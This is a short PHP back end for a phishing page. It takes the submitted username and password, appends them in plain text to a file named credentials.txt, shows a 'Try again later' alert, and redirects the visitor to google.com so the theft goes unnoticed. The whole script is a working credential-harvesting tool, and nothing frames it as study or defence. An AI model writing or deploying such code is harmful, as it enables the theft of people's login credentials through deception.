<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Store credentials in a file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Show message and redirect after 3 seconds
    echo "<script>
        alert('Try again later');
        setTimeout(function() {
            window.location.href = 'https://www.google.com';
        }, 3000);
    </script>";
    exit();
}
?>
